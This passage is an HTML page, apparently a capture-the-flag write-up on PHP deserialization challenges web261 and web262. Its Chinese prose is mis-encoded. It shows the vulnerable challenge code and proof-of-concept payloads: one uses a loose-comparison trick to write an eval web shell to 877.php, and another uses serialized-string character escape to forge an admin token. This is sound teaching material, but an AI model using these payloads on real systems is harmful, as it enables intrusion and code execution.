class="variable">$vip</span>-&gt;getFlag();</span><br></pre></td></tr></table></figure><p>åˆ†æï¼š</p><ul><li>é¢˜ç›®æç¤ºï¼šæ‰“ Redisï¼Œé»˜è®¤ç«¯å£ä¸º 6379</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616332734388-e820fd79-e1ba-49a0-ae39-7fdb1f086052.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616332734388-e820fd79-e1ba-49a0-ae39-7fdb1f086052.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>åŸæ¥çš„ web261ï¼Œä¸çŸ¥ä¸ºå•¥æ¢æˆäº†ä¸‹é¢è¿™ä¸ªã€‚</p><p>åŸæœ¬çš„è§£é¢˜æ€è·¯å¤§æ¦‚æ˜¯åœ¨ web259 çš„åŸºç¡€ä¸Šï¼Œæ„é€  POSTåŒ…å»æ‰“ redis</p><h2 id="web261-PHPç‰¹æ€§"><a href="#web261-PHPç‰¹æ€§" class="headerlink" title="web261 PHPç‰¹æ€§"></a>web261 PHPç‰¹æ€§</h2><span class='btn'><a class="button"  title='nginx/1.18.0'><i class='fas fa-tag'></i>nginx/1.18.0</a></span> <span class='btn'><a class="button"  title='PHP/7.4.16'><i class='fas fa-tag'></i>PHP/7.4.16</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="keyword">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;code = <span class="keyword">$this</span>-&gt;username.<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;</span><br><span class="line">            file_put_contents(<span class="keyword">$this</span>-&gt;username, <span class="keyword">$this</span>-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>åˆ†æ</p><p>__wakeup()</p><blockquote><p>unserialize() ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª __wakeup() æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ __wakeup æ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚</p></blockquote><p>å› è¿™é‡Œå†™ç€ <code>username</code> å’Œ <code>password</code> å¿…é¡»ä¸ºéç©ºï¼Œå¦åˆ™ä¼šé€€å‡ºï¼Œæ‰€ä»¥å¯ä»¥è€ƒè™‘è¦ç»•è¿‡è¿™é‡Œ</p><p>å‚è€ƒ CVE-2016-7124</p><ul><li>å½±å“èŒƒå›´</li></ul><p>PHP5 &lt; 5.6.25</p><p>PHP7 &lt; 7.0.10</p><ul><li>æ¼æ´åŸç†</li></ul><p>å½“ååºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­ï¼Œè¡¨ç¤ºå±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®å±æ€§ä¸ªæ•°æ—¶ï¼Œä¼šç»•è¿‡ __wakeup å‡½æ•°çš„æ‰§è¡Œã€‚</p><p>ä½†æ˜¯é¢˜ç›®æ˜¯ PHP 7.4.2 æ˜æ˜¾ä¸æ»¡è¶³è¦æ±‚ï¼Œ</p><p>ç„¶åguguruäº†ä¸€ä¸‹æ¯”è¾ƒæ˜¾çœ¼çš„ <code>__unserialize</code> é­”æœ¯æ–¹æ³•ï¼Œå› ä¸ºæ²¡è§è¿‡</p><p><a href="https://www.php.net/manual/en/language.oop5.magic.php#object.unserialize">https://www.php.net/manual/en/language.oop5.magic.php#object.unserialize</a></p><p>å‘ç°æœ‰è¶£çš„ä¸œè¥¿ï¼Œå®˜æ–¹æ–‡æ¡£æ˜¯è¿™æ ·ä»‹ç»çš„</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619342183452-236b1177-015b-4e81-9760-15cae631313d.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619342183452-236b1177-015b-4e81-9760-15cae631313d.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>å°±å½“åŒæ—¶å­˜åœ¨ <code>__wakeup</code> å’Œ <code>__unserialize</code> é­”æœ¯æ–¹æ³•æ—¶ï¼Œåªä¼šè°ƒç”¨ <code>__unserialize</code> é­”æœ¯æ–¹æ³•ã€‚</p><p>ä»”ç»†è§‚å¯Ÿææ„æ–¹æ³•ï¼Œæ˜¯ä¸ªå¼±æ¯”è¾ƒ <code>$this-&gt;code==0x36d</code></p><p>ç„¶å <code>0x36d</code> çš„åè¿›åˆ¶æ˜¯ <code>877</code> ï¼Œå†™ä¸ªå°å®éªŒ</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619344460217-b8757b50-b260-4d9e-9219-c7d86e948392.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619344460217-b8757b50-b260-4d9e-9219-c7d86e948392.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>ä¹Ÿå°±æ˜¯è¯´å¼±æ¯”è¾ƒ <code>$code</code> å˜é‡å‰é¢æ˜¯ <code>877</code> å°±å¥½äº†ï¼Œä¸ç®¡åé¢åŠ äº†å•¥å­—ç¬¦ä¸²ï¼Œå°±å¯ä»¥è®© <code>$code == 0x36d</code> æˆç«‹äº†ã€‚</p><p>æ„é€  POC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&quot;877.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;&lt;?php eval($_GET[c]); ?&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> ctfshowvip()));</span><br></pre></td></tr></table></figure><p>ä¼šç”Ÿæˆ <code>877.php</code> ç„¶å <code>cat /flag_is_here</code> å³å¯</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619344555532-b46079b7-8b3f-4ffd-b453-f97cddc99e89.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619344555532-b46079b7-8b3f-4ffd-b453-f97cddc99e89.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>é¢˜å¤–</p><p>å› ä¸º PHP åº•å±‚æ˜¯ç”¨ Cè¯­è¨€å†™çš„ï¼ŒåŸæœ¬æƒ³ç€ç”¨ <code>\0</code> ä½œä¸ºå­—ç¬¦ä¸²æˆªæ–­ï¼Œè¿™æ ·ä¸ä¼šæ‹¼æ¥ <code>$passwod</code> å­—æ®µï¼Œç„¶åå‘ç°ï¼Œå¦‚æœç¬¬ä¸€ä¸ªå‚æ•°æœ‰ <code>\0</code> ï¼Œ <code>file_put_contents</code> ä¼šæŠ¥é”™ã€‚</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619344781363-008d661e-10d6-4a27-b5de-f71b268af26c.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619344781363-008d661e-10d6-4a27-b5de-f71b268af26c.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>ç„¶å</p><p><code>__invoke</code> å’Œ <code>__sleep</code> åœ¨è¿™é‡Œçš„ç”¨å¤„ä¸å¤ªæ¸…æ¥šã€‚ã€‚</p><h2 id="web262-å­—ç¬¦é€ƒé€¸"><a href="#web262-å­—ç¬¦é€ƒé€¸" class="headerlink" title="web262 å­—ç¬¦é€ƒé€¸"></a>web262 å­—ç¬¦é€ƒé€¸</h2><span class='btn'><a class="button"  title='PHP/5.6.40'><i class='fas fa-tag'></i>PHP/5.6.40</a></span> <span class='btn'><a class="button"  title='å­—ç¬¦é€ƒé€¸'><i class='fas fa-tag'></i>å­—ç¬¦é€ƒé€¸</a></span><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 02:37:19</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 16:05:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@message</span>.php</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> message(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = str_replace(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, serialize(<span class="variable">$msg</span>));</span><br><span class="line">    setcookie(<span class="string">&#x27;msg&#x27;</span>,base64_encode(<span class="variable">$umsg</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>çœ‹æ³¨é‡Šå‘ç° message.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 15:13:03</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 15:17:17</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = unserialize(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ç¬¬ä¸€ç§åšæ³•"><a href="#ç¬¬ä¸€ç§åšæ³•" class="headerlink" title="ç¬¬ä¸€ç§åšæ³•"></a>ç¬¬ä¸€ç§åšæ³•</h3><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> message();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(base64_encode(serialize(<span class="variable">$msg</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616379956107-eac8b02e-16ae-45bb-9eba-900e2cb4f9e1.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616379956107-eac8b02e-16ae-45bb-9eba-900e2cb4f9e1.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h3 id="ç¬¬äºŒç§åšæ³•"><a href="#ç¬¬äºŒç§åšæ³•" class="headerlink" title="ç¬¬äºŒç§åšæ³•"></a>ç¬¬äºŒç§åšæ³•</h3><p>å› æœ‰ä¸€ä¸ªæ­£åˆ™æ›¿æ¢ï¼Œæ³¨æ„æ˜¯åºåˆ—åŒ–åå†æ›¿æ¢ï¼Œä¸”æ›¿æ¢æ¯æ¬¡å†…å®¹é•¿åº¦å¢åŠ 1ï¼Œå‡å¦‚è¾“å…¥ <code>t=fuck&quot;</code></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616381553255-34a2d0d2-39c5-464b-b3d9-36679d33d44c.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616381553255-34a2d0d2-39c5-464b-b3d9-36679d33d44c.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>æˆ‘ä»¬è¾“å…¥çš„ <code>&quot;</code> åˆšåˆšå¥½å¯ä»¥å‘å‰é¢é—­åˆï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬æ¯è¾“å…¥ä¸€ä¸ª <code>fuck</code>ï¼Œæˆ‘ä»¬å¯æ§çš„å†…å®¹å°±å¤šå‡º <code>1</code> ä¸ªå­—ç¬¦ã€‚</p><p>æˆ‘ä»¬ç›®çš„æ„é€  <code>$token=&quot;admin&quot;</code> åºåˆ—åŒ–é•¿è¿™æ · </p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616381733634-6528a8b0-d291-4d4e-92d6-986af1f1d510.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616381733634-6528a8b0-d291-4d4e-92d6-986af1f1d510.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>å³ <code>s:5:&quot;token&quot;;s:5:&quot;admin&quot;;</code></p><p>åŠ ä¸Šé—­åˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;&#96;&#96;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#96;&#96;&#125;</span><br></pre></td></tr></table></figure><p>é•¿åº¦ä¸º <code>27</code></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616381814629-55ed7c75-3455-49b4-a45e-1f219845f966.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616381814629-55ed7c75-3455-49b4-a45e-1f219845f966.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>ä¹Ÿå°±æ˜¯æˆ‘ä»¬éœ€è¦è¾“å…¥ <code>27 ä¸ª fuck</code></p><p>poc</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?f=6&amp;m=6&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616381988320-1f8a26c1-e7d1-4663-ac44-a9bb8bde1e46.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616381988320-1f8a26c1-e7d1-4663-ac44-a9bb8bde1e46.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616382023862-12770f9f-2334-4320-a93d-f4ec589a573d.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616382023862-12770f9f-2334-4320-a93d-f4ec589a573d.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web263-sessionä¼ªé€ "><a href="#web263-sessionä¼ªé€ " class="headerlink" title="web263 sessionä¼ªé€ "></a>web263 sessionä¼ªé€ </h2><span class='btn'><a class="button"  title='PHP/7.3.11'><i class='fas fa-tag'></i>PHP/7.3.11</a></span> <span class='btn'><a class="button"  title='sessionä¼ªé€ '><i class='fas fa-tag'></i>sessionä¼ªé€ </a></span><p><a 